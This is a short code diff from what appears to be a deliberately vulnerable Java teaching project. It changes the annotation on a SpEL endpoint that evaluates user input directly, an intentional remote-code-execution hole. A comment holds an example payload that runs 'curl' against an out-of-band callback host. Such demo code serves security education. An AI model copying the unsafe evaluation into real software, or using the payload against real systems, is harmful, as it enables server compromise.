@@ -2,6 +2,7 @@ package org.joychou.controller;
 
 import org.springframework.expression.ExpressionParser;
 import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
@@ -20,7 +21,7 @@ public class SpEL {
      * xxx is urlencode(exp)
      * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
      */
-    @RequestMapping("/spel/vuln")
+    @GetMapping("/spel/vuln")
     public String rce(String expression) {
         ExpressionParser parser = new SpelExpressionParser();
         // fix method: SimpleEvaluationContext
